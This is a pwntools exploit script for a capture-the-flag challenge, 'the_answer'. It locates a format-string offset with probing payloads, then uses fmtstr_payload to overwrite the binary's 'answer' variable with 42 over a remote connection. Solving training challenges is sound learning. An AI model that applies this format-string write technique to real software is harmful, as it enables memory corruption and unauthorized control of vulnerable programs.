#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./the_answer --host answer.challs.cyberchallenge.it --port 9122
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './the_answer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'answer.challs.cyberchallenge.it'
port = int(args.PORT or 9122)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004008cb
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset = 10
find_offset = False
if find_offset:
    for i in range(6, 20):
        io = start()
        payload = b'ABCDEFGH%' + str(i).encode() + b'$p'
        io.sendlineafter(b'name?\n', payload)
        ret = io.recvline().decode()
        if '4847464544434241' in ret:
            print('Offset: ', i)
            exit(0)

payload = fmtstr_payload(offset, {exe.symbols['answer']: 42})
#payload = b'%42c%12$naaaaaaa' +  p64(exe.symbols['answer'])

io.sendlineafter(b'name?\n', payload)

io.interactive()

